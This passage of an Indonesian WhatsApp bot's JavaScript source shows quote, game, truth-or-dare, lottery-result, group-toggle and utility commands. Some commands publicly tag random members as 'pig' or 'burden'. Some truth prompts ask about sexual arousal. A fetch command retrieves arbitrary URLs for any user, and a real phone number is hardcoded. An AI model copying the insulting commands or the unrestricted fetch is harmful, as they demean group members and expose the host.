mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Ketika cinta itu dipertahankan kamu akan tau siapa yang lebih menghargai tentang sebuah hubungan','Dalam hidup ini banyak orang tahu apa yang harus dilakukan, tetapi hanya sedikit yang melakukan apa yang ia ketahui. Mengetahui tidaklah cukup, Anda harus mengambil tindakan','Berilah perhatian lebih ke orang yang kamu sayangi, itu yang mereka butuhkan','Satu ons tindakan sama berharganya dengan satu ton teori','Kita mungkin terpisah sejak lama ketika tak mampu belajar untuk lebih dewasa','Sayangilah dia walau tidak sesempurna seperti yang kau inginkan','Kecantikan akan mengundang perhatian sikap santun memikat Kalbu','Mengetahui tidaklah cukup kita harus melakukannya, keinginan tak cukup hanya dengan berangan kita harus melakukannya','Kesalahan adalah bukti bahwa kamu sedang mencoba','Betapapun jauhnya air mengalir ia takkan pernah lupa hulunya','Lebih baik sendiri daripada bersama dengan orang yang salahBetapapun jauhnya air mengalir ia takkan pernah lupa hulunya','Lakukan sesuatu hari ini yang akan membuat dirimu berterima kasih di hari-hari mendatang','Waktu yang memutuskan Dengan siapa kamu akan berjumpa','Hati yang memutuskan siapa yang kamu inginkan dalam hidup ini','Dengan sikap yang akan menentukan siapa yang akan bertahan dalam hidupmu','Menjadi dewasa dan bijak diawali dengan menjadi muda dan bodoh','Lakukanlah apa yang paling kamu takutkan dalam hidupmu','Bekerjalah seolah kamu tak butuh uang, Cintailah seolah Kamu takkan Tersakiti dan menarilah seakan tak ada yang melihatmu','Jika hari ini sudah sempurna maka Apalah arti hari esok','Bintang pun tak kan bersinar tanpa kegelapan','Suatu saat aku akan menjadi tempat yang akan selalu kau rindu','Guru terbaik kamu adalah kesalahan terakhir yang kamu lakukan','Diam adalah respon terbaik untuk orang bodoh','Jangan pernah membuat keputusan yang permanen untuk perasaan yang sementara','Jika Allah yang menjadi alasan anda untuk hidup maka takkan pernah ada alasan untuk menyerah','Kegagalan ada bukan untuk ditakuti tetapi untuk dipelajari','Anda saat ini adalah hasil dari pengalaman anda','Keberuntungan adalah saat kesempatan datang, anda telah matang dengan segala persiapan','Jangan Menunggu hari yang terbaik untuk melangkah karena setiap hari sangatlah berharga','Keputusan yang baik diperoleh dari pengalaman, dan pengalaman didapat dari keputusan yang buruk','Setiap waktu yang anda lewati dengan sia-sia hanya menjauhkan anda dan semakin jauh dari kata sukses','Realitas kehidupan Anda adalah deskripsi dari jiwa dan pikiran anda','Berani mengambil keputusan maka anda telah melangkah 10 kali lebih cepat untuk sukses','Allah masih mencintai anda jika masih banyak cobaan dan tantangan hidup yang datang menghampiri anda. Allah percaya bahwa anda mampu melaluinya, maka jagalah kepercayaan itu','Ketika orang mengatakan anda sudah berubah sebenarnya itu hanya karena anda berhenti melakukan apa yang mereka ingin anda lakukan','Jangan menukar apa yang sangat anda inginkan untuk apa yang Anda ingin untuk saat ini','Orang-orang yang mengikuti keramaian biasanya tersesat di dalamnya','Orang tua saya bekerja terlalu keras untuk saya bukan supaya saya tidak hanya menjadi orang biasa tetapi menjadi orang luar biasa','Anda menghalangi impian anda ketika anda mengizinkan ketakutan Anda tumbuh lebih besar dari keyakinan anda','Sang juara percaya kepada dirinya sendiri bahkan ketika orang lain tidak percaya','Hanya mereka yang berani mengambil resiko yang jauh pasti dapat menemukan Seberapa jauh seseorang dapat pergi','Tunjukkan teman Anda, saya akan menunjukkan masa depan Anda','Beberapa orang ingin sesuatu terjadi, beberapa orang berharap itu akan terjadi, yang lain mewujudkannya jadi kenyataan','Jika anda menghabiskan waktu untuk mencoba menjadi baik dalam segala hal, Anda tidak akan pernah menjadi hebat dalam apapun','Sebuah perjalanan ribuan mil dimulai dari langkah kecil','Apa yang akan Anda kerjakan, Ketika anda tahu anda tidak mungkin gagal','Ketika kita memiliki satu sama lain, kita Memiliki segalanya','Kebesaran sebenarnya dapat ditemukan dalam hal hal kecil yang terkadang kita lewatkan','Bekerja keraslah, Bermimpilah lebih besar dan jadilah yang terbaik','Apa yang kita pikirkan menentukan apa yang akan terjadi pada kita. Jadi jika kita ingin mengubah hidup kita, kita perlu sedikit mengubah pikiran kita.','Seseorang yang berani membuang satu jam waktunya tidak mengetahui nilai dari kehidupan.','Saya memiliki filosofi yang sederhana: isi apa yang kosong, kosongkan apa yang terlalu penuh.','Hidup adalah cermin dan akan merefleksikan kembali kepada para pemikir mengenai apa yang mereka pikirkan.','Anda di sini hanya untuk persinggahan yang singkat. Jangan terburu, jangan khawatir. Yakinlah bahwa Anda menghirup wangi bunga sepanjang perjalanan.Hidup adalah cermin dan akan merefleksikan kembali kepada para pemikir mengenai apa yang mereka pikirkan.','Hidup adalah serangkaian perubahan yang alami dan spontan. Jangan tolak mereka karena itu hanya membuat penyesalan dan duka. Biarkan realita menjadi realita. Biarkan sesuatu mengalir dengan alami ke manapun mereka suka.','Hidup yang baik adalah hidup yang diinspirasi oleh cinta dan dipandu oleh ilmu pengetahuan.','Kenyataannya, Anda tidak tahu apa yang akan terjadi besok. Hidup adalah pengendaraan yang gila dan tidak ada yang menjaminnya.','Hidup adalah mimpi bagi mereka yang bijaksana, permainan bagi mereka yang bodoh, komedi bagi mereka yang kaya, dan tragedi bagi mereka yang miskin','Hidup itu bukan soal menemukan diri Anda sendiri, hidup itu membuat diri Anda sendiri.','Hal yang paling penting adalah menikmati hidupmu, menjadi bahagia, apapun yang terjadi.','Hidup itu sederhana, kita yang membuatnya sulit.']
					const vasi = motiv[Math.floor(Math.random() * motiv.length)]
					vass = await getBuffer(`https://i.ibb.co/346nsHC/56806462-399407660892553-4745814299438481408-o.jpg`)
					kahfzz.sendMessage(from, vass, image, { quoted: freply, caption:'*Motivasi*\n\n'+ vasi })
					 await sleep(7000)
					 txtt =`Hai Kak ${pushname}\nSemoga Jadi Motivasi Untuk Tidak Menyerah Ya Kak Jika Kaka Ingin Quote Lagi Tekan Button Di Bawah Ini Ya Kak🌬️`

 buttons = [{buttonId: noprefix ? "quotesmotivasi" : "!"+"quotesmotivasi",buttonText:{displayText: 'QUOTES MOTIVASI SELANJUTNYA'},type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Semoga Menjadi Motivasi',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
					break
case 'mining':
var mining = randomNomor(1000)
atm.addKoinUser(sender, mining, _uang)
await reply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
break
case 'waktu':
reply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
break
case 'cekmati':
if (!q) return reply(mess.wrongFormat)
  predea = await axios.get(`https://api.agify.io/?name=${q}`)
reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
case 'togel':
reply(mess.wait)
try {
  dataplai = await axios.get(`https://api.vhtear.com/togel&apikey=${setting.vhtearkey}`)
  dataplay = dataplai.data.result
  let tomgel = `*Huzzzzz*\n`
  for (let i = 0; i < dataplay.hasil.length; i++) {
 tomgel += `\n═════════════════\n\n*Negara* : ${dataplay.hasil[i].Negara}\n*Result* : ${dataplay.hasil[i].Senin}\n*Result* : ${dataplay.hasil[i].Selasa}\n*Result* : ${dataplay.hasil[i].Rabu}\n*Result* : ${dataplay.hasil[i].Kamis}\n*Result* : ${dataplay.hasil[i].Jumat}\n*Result* : ${dataplay.hasil[i].Sabtu}\n*Result* : ${dataplay.hasil[i].Minggu}\n`
  }
  sendText(from, tomgel)
} catch (err) {
  console.log(err)
}
break
case 'toxic':
Toxic().then(toxic => {
  reply (toxic)
})
break
case 'citacita':
const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']
const cita3 = cita[Math.floor(Math.random() * cita.length)]
cita2 = await getBuffer(cita3)
kahfzz.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: freply})
break
case 'apakah':
apakah = body.slice(1)
const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
const kah = apa[Math.floor(Math.random() * apa.length)]
kahfzz.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: freply })
break
case 'rate':
case 'nilai':
rate = body.slice(1)
const ra =['0','4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
const te = ra[Math.floor(Math.random() * ra.length)]
kahfzz.sendMessage(from, '*Pertanyaan :* '+rate+'\n*Jawaban :* '+ te+'%', text, { quoted: freply })
break
case 'bay':
reply('Sayonara buat yang pergi😔\n Semoga amal ibadahnya di terima :)')
break
case 'selamatdatang':
reply('welcome kak jangan lupa patuhi peraturan  grup ya kaka \n Semoga betah👏')
break
case 'gantengcek':
case 'cekganteng':
ganteng = body.slice(1)
const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
const teng = gan[Math.floor(Math.random() * gan.length)]
kahfzz.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: freply })
break
case 'cantikcek':
case 'cekcantik':
cantik = body.slice(1)
const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
const tik = can[Math.floor(Math.random() * can.length)]
kahfzz.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: freply })
break
case 'cekwatak':
var namao = pushname
var prfx = await kahfzz.getProfilePicture(sender)
const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
const wtk = watak[Math.floor(Math.random() * (watak.length))]
const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
const sft = sifat[Math.floor(Math.random() * (sifat.length))]
const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colkahfz','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const hby = hobby[Math.floor(Math.random() * (hobby.length))]
const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
const typo = tipe[Math.floor(Math.random() * (tipe.length))]
await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
break
case 'hobby':
hobby = body.slice(1)
const by = hobby[Math.floor(Math.random() * hobby.length)]
kahfzz.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: freply })
break
case 'bisakah':
bisakah = body.slice(1)
const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
kahfzz.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: freply })
break
case 'kapankah':
kapankah = body.slice(1)
const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
kahfzz.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: freply })
break
case 'truth':
const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
kahfzz.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: freply })
break
case 'dare':
const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
buff = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
buttons = [{buttonId: noprefix ? command : "!"+command, buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
contentText:'*Dare*\n\n'+ der,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
kahfzz.relayWAMessage(prep)
break		
case 'jadian':
jds = []
jdii = groupMembers
koss = groupMembers
akuu = jdii[Math.floor(Math.random() * jdii.length)]
diaa = koss[Math.floor(Math.random() * koss.length)]
teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
jds.push(akuu.jid)
jds.push(diaa.jid)
mentions(teks, jds, true)
break
case 'cantik':
membr = []
const mes = groupMembers
const msk = groupMembers
const siaps = mes[Math.floor(Math.random() * mes.length)]
const sips = pushname[Math.floor(Math.random() * msk.length)]
teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
membr.push(siaps.jid)
mentions(teks, membr, true)
break
case 'ganteng':
membr = []
const nus = groupMembers
const msl = groupMembers
const siapss = nus[Math.floor(Math.random() * nus.length)]
const sipss = pushname[Math.floor(Math.random() * msl.length)]
teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
membr.push(siapss.jid)
mentions(teks, membr, true)
break
case 'babi':
membr = []
const meg = groupMembers
const mge = groupMembers
const ba = meg[Math.floor(Math.random() * meg.length)]
const bi = pushname[Math.floor(Math.random() * mge.length)]
teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
membr.push(ba.jid)
mentions(teks, membr, true)
break
case 'beban':
membr = []
const nge = groupMembers
const tod = groupMembers
const beb = nge[Math.floor(Math.random() * nge.length)]
const an = pushname[Math.floor(Math.random() * tod.length)]
teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
membr.push(beb.jid)
mentions(teks, membr, true)
break
//------------------< Lainnya >-------------------
case 'getpp':
if (kahfz.message.extendedTextMessage === null || kahfz.message.extendedTextMessage === undefined) {
 linkpp = await kahfzz.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
 buffer = await getBuffer(linkpp)
 kahfzz.sendMessage(from, buffer, image, {caption: "Nih", quoted: freply })
} else if (kahfz.message.extendedTextMessage.contextInfo.mentionedJid === null || kahfz.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
 mberr = kahfz.message.extendedTextMessage.contextInfo.participant
 linkpp = await kahfzz.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
 buffer = await getBuffer(linkpp)
 kahfzz.sendMessage(from, buffer, image, { quoted: freply, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
} else if (kahfz.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
 mberr = kahfz.message.extendedTextMessage.contextInfo.mentionedJid[0]
 linkpp = await kahfzz.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
 buffer = await getBuffer(linkpp)
 kahfzz.sendMessage(from, buffer, image, { quoted: freply, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
}
break
case 'd':
case 'del':
  case 'delete': // MR.CYSER
  try {
if (kahfz.message.extendedTextMessage === undefined || kahfz.message.extendedTextMessage === null) return reply('Reply chat bot')
  kahfzz.deleteMessage(from, {id: kahfz.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true})
 } catch (e){
reply('Reply chat bot')
 }
 break
 case 'tes':
 reply('Okeh nyala')
 break
  case 'info':  // Jangan Di Ubah Plise
  urlinfo = 'https://telegra.ph/file/5a8d6bf0339cc120bfb6c.jpg'
  thankslort = `┌──「 *INFORMATION* 」
  │
  ├ *BOT TYPE* : NodeJS
  ├ *NAME*  : kahfzz
  ├ *VERSION* : 1.0
  ├ *GITHUB* : https://github.com/K4HFZ
  │
  ├─「 *𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊* 」
  │
  ├ ALLAH SWT
  ├ Nino Chan
  ├ Xinz Bot
  ├ Manurius
  ├ Arif
  ├ Fathur
  ├ Kahfz (Saya)
  ├ Nyx (Panutan Saya)
  ├ Kwn² Yg Bantu Gw
  ├ And all creator bot
  ├  Kahfz Bot ( Saya )
  │
  └──「 *${botName}* 」`
  kahfzz.sendMessage(from, await getBuffer(urlinfo), image, {quoted: freply, caption: thankslort })
  break
  case 'media':
  if (!q) return reply('Urlnya?')
 reply(mess.wait)
  sendMediaURL(from, `${args[0]}`, "").catch(() => reply('Error'))
  break
  case 'get':
case 'fetch': //ambil dari nuru
if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')
 res = await fetch(q)
  if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
 delete res
 throw `Content-Length: ${res.headers.get('content-length')}`
  }
  if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
 txtx = await res.buffer()
  try {
 txtx = util.format(JSON.parse(txtx+''))
  } catch (e) {
 txtx = txtx + ''
  } finally {
 reply(txtx.slice(0, 65536) + '')
  }
  break
  case 'searchmsg': 
case 'caripesan':  //by ANU TEAM
if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${prefix + command} halo|10`)
 teks = arg
if (teks.includes("|")) { 
 try {
var ve = teks.split("|")[0]
var za = teks.split("|")[1]
sampai = `${za}`
if (isNaN(sampai)) return reply('Harus berupa Angka!')
  batas = parseInt(sampai) + 1
if (batas > 30) return reply('Maks 30!')
  reply(mess.wait)
cok = await kahfzz.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan') 
  if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
 for (i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
  kahfzz.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
}
 }
  } catch (e) {
 return reply(String(e))
  }
} else {
  reply(`Format salah tod, ini contoh format yang benar : ${prefix + command} halo|10`)
}
break
case 'lolkey':
case 'cekapikey':
if (args.length < 1) return reply(`Ketik ${prefix}lolkey [Apikeynya]`) 
 anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${q}`)
  teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://lolhuman.herokuapp.com`
  kahfzz.sendMessage(from, teks, text, {quoted: freply})
  break
  case 'bugreport':
  if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
 teks = args.join(' ')
  reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
  kahfzz.sendMessage('6283127014833@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
  break
  case 'readall':
  totalchat.map( async ({ jid }) => {
 await kahfzz.chatRead(jid)
  })
  reply(`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)
  console.log(totalchat.length)
  break	

//------------------< Enable/Disable >-------------------
case 'leveling':
if (!isGroup) return reply(mess.only.group)
  if (ar[0] === 'enable') {
 if (isLevelingOn) return reply('Fitur leveling telah diaktifkan sebelumnya.')
_leveling.push(from)
 fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
 reply('Fitur leveling berhasil diaktifkan.')
  } else if (ar[0] === 'disable') {
 var anup = _leveling.indexOf(from)
 _leveling.splice(anup, 1)
 fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
 reply('Fitur leveling berhasil dimatikan.')
  } else {
 reply('Pilih enable atau disable!')
  }
  break
  case 'antilink':
  if (!isGroup) return reply(mess.only.group)
 if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
if (!q) return reply(`Pilih enable atau disable`)
  if (args[0].toLowerCase() === 'enable'){
 if (isAntiLink) return reply(`Udah aktif`)
antilink.push(from)
 fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
 reply('*「 ANTILINK DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')
  } else if (args[0].toLowerCase() === 'disable'){
 let anu = antilink.indexOf(from)
 antilink.splice(anu, 1)
 fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
 reply('*「 ANTILINK DI NONAKTIFKAN 」*')
  } else {
 reply(`Pilih enable atau disable`)
  }
  break
case 'antilinkyt':
  if (!isGroup) return reply(mess.only.group)
 if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
if (!q) return reply(`Pilih enable atau disable`)
  if (args[0].toLowerCase() === 'enable'){
 if (isAntiLinkYT) return reply(`Udah aktif`)
_antilinkyt.push(from)
 fs.writeFileSync('./database/group/antilinkyt.json', JSON.stringify(_antilinkyt))
 reply('*「 ANTILINK YT DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')
  } else if (args[0].toLowerCase() === 'disable'){
 let anu = _antilinkyt.indexOf(from)
 _antilinkyt.splice(anu, 1)
 fs.writeFileSync('./database/group/antilinkyt.json', JSON.stringify(_antilinkyt))
 reply('*「 ANTILINK YT DI NONAKTIFKAN 」*')
  } else {
 reply(`Pilih enable atau disable`)
  }
  break  
  case 'antivirtex':
  if (!isGroup) return reply(mess.only.group)
 if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
if (!q) return reply(`Pilih enable atau disable`)
  if (args[0].toLowerCase() === 'enable'){
 if (isAntiVirtex) return reply(`Udah aktif`)
_antivirtex.push(from)
 fs.writeFileSync('./database/group/antivirtex.json', JSON.stringify(_antivirtex))
 reply('*「 ANTI VIRTEX DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')
  } else if (args[0].toLowerCase() === 'disable'){
 let anu = _antivirtex.indexOf(from)
 _antivirtex.splice(anu, 1)
 fs.writeFileSync('./database/group/antivirtex.json', JSON.stringify(_antivirtex))
 reply('*「 ANTILINK YT DI NONAKTIFKAN 」*')
  } else {
 reply(`Pilih enable atau disable`)
  }
  break  
  case 'antibocil':
  if (!isGroup) return reply(mess.only.group)
 if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
if (!q) return reply(`Pilih enable atau disable`)
  if (args[0].toLowerCase() === 'enable'){
 if (isAntiBocil) return reply(`Udah aktif`)
_antibocil.push(from)
 fs.writeFileSync('./database/group/antibocil.json', JSON.stringify(_antibocil))
 reply('*「 ANTI BOCIL DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')
  } else if (args[0].toLowerCase() === 'disable'){
 let anu = _antibocil.indexOf(from)
 _antibocil.splice(anu, 1)
 fs.writeFileSync('./database/group/antibocil.json', JSON.stringify(_antibocil))
 reply('*「 ANTILINK YT DI NONAKTIFKAN 」*')
  } else {
 reply(`Pilih enable atau disable`)
  }
  break  
  case 'welcome':
  if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('!welcome enable/disable')
  if ((args[0]) === 'enable') {
 if (isWelkom) return reply('Udah aktif')
welkom.push(from)
 fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
 reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
  } else if ((args[0]) === 'disable') {
 welkom.splice(from, 1)
 fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
 reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
  } else {
 reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
  }
  break
  case 'mute':
  if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admin)
if (args.length < 1) return reply('!mute enable/disable')
  if (args[0].toLowerCase() === 'enable'){
 if (isMuted) return reply(`udah di mute`)
mute.push(from)
 fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
 reply(`*...:* *MUTE ON* *:...*\n\nPerhatian untuk member grup\nBot telah di mute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
  } else if (args[0].toLowerCase() === 'disable'){
 anu = mute.indexOf(from)
 mute.splice(anu, 1)
 fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
